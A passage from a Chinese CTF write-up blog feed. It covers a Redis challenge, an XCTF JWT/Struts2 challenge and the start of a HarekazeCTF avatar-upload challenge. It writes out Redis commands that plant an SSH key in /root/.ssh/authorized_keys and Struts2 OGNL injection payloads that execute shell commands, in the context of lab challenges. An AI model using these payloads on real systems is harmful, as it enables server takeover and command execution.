</p><p>大致过程与条件：</p><ol><li>客户端生成私钥和公钥，将公钥拷贝给服务器端</li><li>客户端发起登录请求</li><li>服务器端根据客户端发来的信息查找是否存有该客户端的公钥，</li><li>客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证</li><li>服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对</li></ol><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录。</li></ul><p>首先用工具连接到redis服务器 只要隧道搭建没问题都能连上 就是这个环境太折磨人了 </p><p>不过也没办法 能体会到出题人的一片苦心 只怪搅屎棍太多了 素质太差</p><p>需要注意的是ip会发生变化是动态的 连接不上的的时候一定要去再看看 而且题目环境会隔一段时间重启</p><p> 首先在自己攻击机申请公私钥 将私钥保存在自己物理机上 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa # ⽣成公钥和私钥</span><br><span class="line">redis服务器写入</span><br><span class="line">set x <span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVuidivu8ahaTWtPekYXjkm0ya2rJ9uYFXQ6ca0GO9ny478xL8sU6Qg3Cpzr1/uWGOahpACX2CLjnkRxiZAuxwymqGyq0/jYoLLuGfKCIOdb/WL5mcsdubiVvjC4jWSLIvlwB/rk2LS5DNC2+fnBGuVKDRNLn6BY4w8vRdqowA9/Gy5+gJwBR9TY1J6KQUTc0LXNasQIhBbqXYTQwfcqdhBs929Uq5yOIs+1KawJJrmkWkENvbat7BphjlUhvZUrynEpCNZ0kJVxq2Pj4ltks1WMknE+cES10LJQDSlhjxNuED52QPdcIjqtKUZZk3P7hKwLmO782D3/stPQ0Q4RMWeaUvJLRFLtep1uf+O5YQTtJ8NJzFP+nntNX/NB7HKk4dIy+PnQOh1TaEAAWXK5TR6SgrRttAUcZzhrbTjNNvqRHq9VJplE7hFoaqJXQhD7x7UgjPJqK8kP0b/kpza68+ljgD7PZJSUl7q5gJ5yicGvBUNht/6Y/qqn4KonDpYH8=\n&quot;</span></span><br><span class="line">config set dir /root/.<span class="property">ssh</span></span><br><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693570658936-a03a4b9b-acca-46c8-bc6a-a3a5173fff98.png" alt="img"></p><p>然后用私钥ssh 22端口链接即可</p><p>然后就能得到最后一段flag</p><p>被环境折磨。。。</p><p>收获还是颇多 很值得</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hw工具箱</title>
      <link href="/post/b361a80b.html"/>
      <url>/post/b361a80b.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a0c688f5a420c1090dd8c0be6f0a5339be0c2175ff3adaa9636076cc9b64e1b5">7e7a80f49269c6c502f4158d2f64667fa44213fb46b4c282069abacec26bd2620e1505ce5d34c7c3dfce754cc5b4f5757818d39e25c3cced57cde7a56bbaf31c93bc67c5ea5129b297e9b4c199ce99280efb236a4f09316e4ede5d51602b28b7be8979a4406e816f3bfc6a58eddfec6864066521240a1f87efb396fb5e47ccce2a970975e990872f693e6868803c65454ecd161d344efa63525b63787898c5d212aa49ec8e113f1a67a35dea6045f480eadb42d28ac3c0b8344cf05334ee6bef796c17c3684a5803bb6078f88ee854f0de9ee719455e9024a0a63ff08652554f421859e3c62a1ec09c8a52ffa3df490e75acde080fc310b7d578ed723257210dfa829cc87460e89d8c936350e094c298fc34a98711332fa4b816eef9d6067d302068f2723468c3858b6581ad91115335493a63836f2a2ddaa0437231cfc25a5176dfa5593a499ac5be96df0147522bb7ba83e991b8f4a5953fbbfee699d95f7b75c962fcf8ff6cb8e613a07857ae804dbefbee9670f1b8c3efea8ea880f47a997fa446d74f781d0293c1cc14cd94b08c1e17a495ce9f5e0548d4f4e348c042841ba84d27f4be9f63ef4aeb1d0bff57cec763cf50c0669e0a2cf3362e63dbb0a24fef5872f53104fb54e044da0eb690341ea0007ce492cc87af79bd7ecb98900d300808ddd34b156dec2a6084731b97e99d90806b1aff5364811f9278afb9a07fbb79b91d2b82e7caae7d86516924d3ffc4b5d00f5bf1b1befdf58f7b28f3feb6c9cb1d69827f1b4745bd97e1e30b0f95020de132e61b87256d4a1113421f1e551210ceccd8a09d450e6748e5dc8ac73f36e4e58dfb054572c5c0ca706b88a2fb864ca653180f32c9b0893747d07386490c39095980d1f6b8227016707c9f01b2858b19e2f6df963c4b56f53037ff186b6ab77326c42433578af1610e429bbc662c9301d84a46f5000b123ef7ba83351193331ad81de91289f809b4435a8ca688b4464eacd8d74ad6f0e5c3b4ee800fb72f63c01484f521b3337b8f7571e44829963a3963ab7ecdac9aefb10d52d4241f69a18af478bf244d9f8a675c6c03a563db67b87fbbf0b0aa1a13e53bb009d700977318544ee13e2597ca1aa6b8ff22c7bcf8808b0a56da04b7518535aff572a8933e15fc4b4bab6494ac368b295a47e90b270ccaa739ae7bcc3e45e3a09f8dc40d1e806c7361db692e7307882546a9b6fb7b8eba45e5147b6a81bad75bc522980ba4a004104f57396c045371e466dd93f571ce6a7278e0ffedfa6fb34531d8f928b6f9fbc879ce7d86252eb7703acf4bb498081508573291792fc172aba97d95ef2657b31f5bd476c4c2f23e98856346e1756d86a7efc6848ab02d00efecd48ab8b74e74bc6391802b406ddc1ae8aeed180bc46e96f80ef557b74d204f98156fd9783bd76525f43b77b62f290873db4aa4740d12f4f230f31c539b6cfc9840d42b2eb298b68c2b6ac702eea2a04ea450c307fe0be169825969e53cf82eada1d93fec5a10a3635bc4ef88bfdc9a18b7b5c76e719657461f8fad590ddfd9b9266a7d3b58b0282e625ca7b0a25b384b0e33acee2d6315ede1f1fa22ff39a5bfcfb2266b2f027c44918029d14486c402ac91606bd62f8150d1c0a1469766a52d5e509e1e6ef406078704ab97a71e197ac220e7a8a91e5ea438c68ea257d4a9ba27f0bcb79825fc375c8c1883dab5ac8c06943783564f5b4bca4955da2997f8522f42d2ce8366a12472a5cfa4ec1753067474708bd8dc9343e106c0d5a5f1e3bdefdcd619fc5ef0302064c6d0464ebe06fcc3e24689d13d624f3cb461dad9e4f09dfd616da5cfb62f56e12428eb3f3547356dc7e452f34d746e324ec61755a645769d0a89771b9f8048606d0b1f104ae906f1ca21bd244311815d8b371212ed21531c27cc0051fab079fbd309c6ef7e4f6115672efd0352bb4fc5ba75ee2f16e55b37aaaa2641feb8bf81010ad43f3b2c60eea70bbe1582f411e31a84a5ba282b4d28c1e2197eadb5de2a4dc47309c48198d875771d4d3199b4dc56d526528ea647b157a40e5a679353328f572ef368d680cbe85e96db5df51e73aa88cb473672686c43e5f552ede5f330a76b94b999b202f4c4cde76dd4645c7b37dae85f7f6ced3ce32a3fae548f7bf0e87bf55bf8e5c3342653888a472fa21f423962bad67a7e9ad14323560cb435e3f6f17b02a1e242a71916012178cae6817b961772a5f6a20a8426ae093064ee5b551d6062d7f8d4c47cd98d8282b48de0d4d2812fa9f269e228aaf2946874e02a0ed41de09e14e0eb3ce9bd6d03b40754188e76bd464b3f288fac88c8401b05b8920fc94d5b1b87c97e33de9d212442a978472090ad41cdde8bc11ac782ff7909389f14cfc141f844db43e0cb36ed7c8f15bc2ff43cc6e5e8518e8e68f809981b4fc7acc17cbfb5cfa637c77296a86b508f1d700b06efc3c5d5aeeb85c9243eb8048f9907cd6d6dfcecbc3d5fc56f408cf8ebcaf8104d04a7ffb2ac50ad8e02f68fd2b712417539b96d76126d53d0fbc634c5c4f08ec47d4a7858d6ae19765557480d8fca84f83a0affe5b7cef870168b40343c0e53a54b27adc3ba782332d199a2f4170ea2302b67db13a7e138e4edd05c7d43cdfa9c8b3cfa0b80c39fe99e293cbf9fb950a591ac11208ce4e820db2eaa2a8ce3abb4d5f2b974c1e10076c986de1d19b25ce488cdaf389fa47e03e0517194c3886d29642437d2ccdce801dbe953fae488c4487c40d5599cabb769e23f619840d9cfb86bee138ee24793a68886269e6824d3f4a5c02103c103539ee0083406eab3ab9bd945d1479b7e58062db2d117f74dbe9839f9b33b512d753d1cd4be90a6b681137f5dde8bbb8655eae36cf6de00ee0ea182a60bb6250e2c0d8fbd646fa98efabf4de5f949e824d4dbfbaa0413c987523b3d052a96f6e9fcc8de94e66ee520791e5cf4e7be8a96b36a81a151ec9a93e3e7e8c2342146008e93274c842c115afb500189a9ad3642081b8e361b3c0acbae19f15d316fb19f46b7913c8187cae35f117461c72a1b58e62331b527b52bdef4b1463f8fec277390be23a60d225a37c85ff4d7d19f26dd9c410d42e19fc94943bab61cd141578a8780a9f2fe072c5ec14ca5f1833febaf7d96491216706ca0ed5428270e5220811486aa80a3f317e4c135d36ad4c9a43a4b4b6393ae5d019922ad50096489f886978781a2f05650088aeace4c0893f80d10c9d48f9204d6eef97ca0ba7279b38c8cd0b215600f48ddc7c877a059705f7d3b5e72fb3d184510daa594a11a08e9f766e6d275d6756bbd16be847adda58b52fdcd1c8866a7551a9e0def02dbab406e97a5741207d5e37cbdfc67b0363870b94341e93f66787a50f0d31606200c8aa6616ea3cb854b59a42551fdc27f3b5dc1559087804f4dc2517101c3df1d52f4ea8fab2fe5e6b06994402769b026ec18dac93dd0dd76d5ae46fb67ee8cbd137fd4b272e95cb303b75d5dfffe9b1c32846a97237170daf00fdda12784f3d8686fa6dba9c9eab644d31d2524554ce9bdb1f85c8c461ac9d28b2b0afff9af206029a82d89e6e765be6dd55937c44d7fd1bc6a979dda5947fc8ea10f48576164fc6def73ff637f8866468eb22ded7bab94a1d3ecaac5a887daa65738f7f13b51a360a7c1d0ff674c0587267061bcbfbe9773a0519cf6e3e105d215d51e5086d3fb37629b34904cdeef20fdd3a10189f156e964c1dc66f17c365d3c6ce0ab93934b60f0810e216296bb72965d82c399b6578ba6042e7b22468c0f8efd862110aafa15e6650bf6c7763799a9c73a1dc29e40e7e51fc6a1b3f25b27ce63e79a5fbbdf3249d7c24d8f3abab29bff457d16446efd6280ad39eaebda554d7e307342bd3e2448fbd11d79bc290d35c8bc341d52be880ca78b262469716545b9bc776ad208198899a56646e0c77617ffb8f83871db5a2742189c6f8dfc573033e4b6e17fac702e6a6aff22e8cfb5da851304a74ed0fa41e76cd7434f335d3d556366019987a58e8e4ae837c5c596bf778861e3f8908c56271d3116888fd99b6126b6069b5fa2c31d90078cc07a67b1ace79cc3e295ccddcf58010a0b84e0d12f9a25c95c78d1312be0d212390c724e0acd14e83b17e49a93c1df12bc085d6737bb0c00ba755f30c99ddd058b9c58777676c22b1675d6d6d37d2937a27601f9d6552b05415e6f37c69916fdda66f2ed9757e0b3247ae4fd1f0e750318824cefd1f567c2d9db321a97f991c4e863de535b3be19c5f4afb55f872951f27353822fe87c250e0ca4a347f698f5def2a50b40c9bc2a30ee0227507a89d5a2fd2b29de6a6a91ea08004830df79f46d9ba191c3e39e1c5173bb7c82ddfe2cf939f56cd87f8233e346b105a17bf0c05719e4ff4c3e32d47789010fbaa389438eaed19e781e499d7a30a5b81134635d2c1dc0b54b880f84508a4b746f97e79d1cae1f6e40a4cac6fe345f9b66e84e8407fef0cd2154538d563bf3d6653605a064fcef381f4eb69908b12b2e11780ce137ee3812595a309710b16fdab0027f32cfcf7afbe216f02c2d1988bac35a0d1017d88045c0ff5d02e1ef0f32550070498ea1d7cfc9e78b05af630da2327987b19cae389f0a0bf7a6e82a764e9343c7226c19f040c20cf42802150bd95cc023d78fd5a4e6d61fcc014b923301dd73f1befdedfbb242e5f567fa91e0e5eb606196a03a12193dd8a5e06da2462bddea8998fcb6ec3ddef22842df10d055331092babcdbdde4e9a05ccc218830251465e05ec10063fa173526e02eadf1a4365f1cb56ddc1cc991f0e9c6564a64a3049d33ea1f46b2308e01b201228bb56b887e98e6b39e652ccb577cab9cdbe74d9c64facb55ce961bacc5f77877f7ebd0165da0f7b7153b100ef6a3c465979f148656b1808083a7d865892d466ce97357ab885e5b8174301192181b10c18d3c21159581a008f118b2610f183a183ae76b95c37df1bbe00e837665a963460a8d661441a340e11a9b7ac8ddd24654c9dbbbf251d4ae6561ebf3fb20539ae</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF简单记录</title>
      <link href="/post/85812b61.html"/>
      <url>/post/85812b61.html</url>
      
        <content type="html"><![CDATA[<p>web狗没啥参与感</p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>web就一道题目 </p><h2 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2><p>考点：</p><p>哈希长度扩展攻击 jwt伪造 structs2 s2-016</p><p>源码发现<code>JWT_key.php</code> </p><p>获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致浏览 就是要么我们能得到他的盐值 要么输入密码为root 但是又不容许我们输入密码为root</p><p>总之就是要让<code>$_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)</code>成立</p><p>直接用hashpump参考<a href="https://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&request_id=&biz_id=102&utm_term=hashpump&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&spm=1018.2226.3001.4187">https://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hashpump&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&amp;spm=1018.2226.3001.4187</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690788963635-a551229f-e941-4ec8-a654-cd95298a7d88.png" alt="img"></p><p>得到之后打入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789103062-9ee0da7c-da07-4285-bdf4-1cb8e0e84fb6.png" alt="img"></p><p>得到jwt的key为<code>sk-he00lctf3r</code>然后伪造登录</p><p>发现源码提示 do you know struts2?</p><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式  </p><p>官方wp是在age注入<code>%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27</code> 但是我之后复现没成功 没有回显</p><p>但是我的payload是这样 可能是非预期 来源 <a href="https://xz.aliyun.com/t/4603">https://xz.aliyun.com/t/4603</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admiiiiiiiiiiin/user.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /flag%27%29.getInputStream%28%29%29%7D</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789835158-46956817-70ad-4e98-8494-b82ba94c3915.png" alt="img"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><p>CVE-2023-28303  </p><p>比赛的时候找到工具了 没试 我TM。。。。</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a> 直接用工具梭哈恢复就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787514977-7cf9931f-6f99-436e-9048-ffe0dda8874e.png" alt="img"></p><h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787906068-9d4f095e-a3c1-4ec2-887c-e53980fa8cc8.png" alt="img"></p><p>太离谱了这个 </p><p>龙语，游戏《上古卷轴V：天际》中出现的语言</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787993320-76273c76-7cba-48e8-a7c2-6f63851b7730.jpeg" alt="img"></p><p>*<strong>ctf{GIKRVZY}</strong> </p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题（page 4-2）</title>
      <link href="/post/d33f9f0e.html"/>
      <url>/post/d33f9f0e.html</url>
      
        <content type="html"><![CDATA[<p>buu刷题（page 4-2） </p><span id="more"></span><p>越来越复杂 越来越吃力了 –^–</p><h1 id="113、-HarekazeCTF2019-Avatar-Uploader-1"><a href="#113、-HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="113、[HarekazeCTF2019]Avatar Uploader 1"></a>113、[HarekazeCTF2019]Avatar Uploader 1</h1><p>一道挺有趣的题目</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png" alt="img"></p><p>登录一下 让我们上传头像 并且图片格式为png 并且大小小于256x256</p><p>ok 这道题目我其实最大的疑惑是源码怎么来的 也许只是buu没给源码？</p><p>直接来看源码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">require_once(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">require_once(<span class="string">&#x27;lib/util.php&#x27;</span>);</span><br><span class="line">require_once(<span class="string">&#x27;lib/session.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$session</span> = new <span class="title class_">SecureClientSession</span>(<span class="variable constant_">CLIENT_SESSION_ID</span>, <span class="variable constant_">SECRET_KEY</span>);</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> check whether file is uploaded</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) |<span class="params"></span>| !is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    error(<span class="string">&#x27;No file was uploaded.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/<span class="regexp">/ check file size</span></span><br><span class="line"><span class="regexp">if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;</span></span><br><span class="line"><span class="regexp">    error(&#x27;Uploaded file is too large.&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ check file type</span></span><br><span class="line"><span class="regexp">$finfo = finfo_open(FILEINFO_MIME_TYPE);/</span><span class="regexp">/获取文件MIME类型</span></span><br><span class="line"><span class="regexp">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span></span><br><span class="line"><span class="regexp">finfo_close($finfo);</span></span><br><span class="line"><span class="regexp">if (!in_array($type, [&#x27;image/png</span><span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> file is <span class="keyword">not</span> <span class="variable constant_">PNG</span> format.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// check file width/height</span></span><br><span class="line"><span class="string">$size = getimagesize($_FILES[&#x27;</span>file<span class="string">&#x27;][&#x27;</span>tmp_name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> image is too large.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if ($size[2] !== IMAGETYPE_PNG) &#123;</span></span><br><span class="line"><span class="string">    // I hope this never happens...</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">What</span> happened...? <span class="variable constant_">OK</span>, the flag <span class="keyword">for</span> part <span class="number">1</span> <span class="symbol">is:</span> &lt;code&gt;<span class="string">&#x27; . getenv(&#x27;</span><span class="variable constant_">FLAG1</span><span class="string">&#x27;) . &#x27;</span>&lt;<span class="regexp">/code&gt;&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ ok</span></span><br><span class="line"><span class="regexp">$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;</span></span><br><span class="line"><span class="regexp">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/</span><span class="string">&#x27; . $filename);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">$session-&gt;set(&#x27;</span>avatar<span class="string">&#x27;, $filename);</span></span><br><span class="line"><span class="string">flash(&#x27;</span>info<span class="string">&#x27;, &#x27;</span><span class="title class_">Your</span> avatar has been successfully updated!<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">redirect(&#x27;</span>/<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure><p>最重要的是这两部分：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/ check file type</span></span><br><span class="line"><span class="regexp">$finfo = finfo_open(FILEINFO_MIME_TYPE);/</span><span class="regexp">/获取文件MIME类型</span></span><br><span class="line"><span class="regexp">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span></span><br><span class="line"><span class="regexp">finfo_close($finfo);</span></span><br><span class="line"><span class="regexp">if (!in_array($type, [&#x27;image/png</span><span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> file is <span class="keyword">not</span> <span class="variable constant_">PNG</span> format.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// check file width/height</span></span><br><span class="line"><span class="string">$size = getimagesize($_FILES[&#x27;</span>file<span class="string">&#x27;][&#x27;</span>tmp_name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> image is too large.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if ($size[2] !== IMAGETYPE_PNG) &#123;</span></span><br><span class="line"><span class="string">    // I hope this never happens...</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">What</span> happened...? <span class="variable constant_">OK</span>, the flag <span class="keyword">for</span> part <span class="number">1</span> <span class="symbol">is:</span> &lt;code&gt;<span class="string">&#x27; . getenv(&#x27;</span><span class="variable constant_">FLAG1</span><span class="string">&#x27;) . &#x27;</span>&lt;<span class="regexp">/code&gt;&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>第一部分通过 finfo_file()来获取mine信息 要求我们上传的是png图片</p><p>第二部分getimagesize()来获取大小并且不只是大小还有其他图片信息 这个函数会返回一个包含图片信息的数组</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578104255-28975875-7950-4504-9327-5b15c60952bb.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span>[<span class="number">2</span>] !== <span class="variable constant_">IMAGETYPE_PNG</span>) &#123;</span><br><span class="line">    <span class="regexp">//</span> I hope this never happens...</span><br><span class="line">    error(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span 